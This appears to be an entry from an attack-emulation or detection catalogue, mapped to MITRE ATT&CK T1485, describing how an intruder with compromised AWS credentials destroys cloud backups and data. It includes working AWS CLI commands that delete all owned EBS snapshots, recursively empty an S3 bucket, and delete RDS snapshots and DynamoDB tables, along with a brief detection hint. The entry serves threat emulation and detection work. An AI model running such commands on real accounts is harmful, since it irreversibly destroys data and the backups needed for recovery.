---
id: cloud-snapshot-destroy
title: Destroy cloud backups & data (snapshot / bucket deletion)
section: AWS / cloud impact
phase: Impact
attack:
  tactic: TA0040
  techniques: [T1485]
platform: [cloud]
source: MITRE ATT&CK T1485; cloud data destruction / extortion
pair: cloud-destroy-cloudtrail
---

The cloud analogue of shadow-copy deletion and encryption in one move: with
compromised IAM, delete the durable copies — EBS/RDS snapshots, versioned S3
objects, DynamoDB tables — so there is nothing to restore from, then optionally
empty the live buckets. Wiping snapshots first denies recovery; deleting objects is
the destructive payload. Each call is a discrete control-plane event, so a burst of
deletes across storage services from one principal is the signal. (Cloud — no
on-host slots.)

```sh
aws ec2 describe-snapshots --owner-ids self --query 'Snapshots[].SnapshotId' --output text \
  | xargs -n1 aws ec2 delete-snapshot --snapshot-id
aws s3 rm s3://<critical-bucket> --recursive
aws rds delete-db-cluster-snapshot --db-cluster-snapshot-identifier <snap>
aws dynamodb delete-table --table-name <table>
```
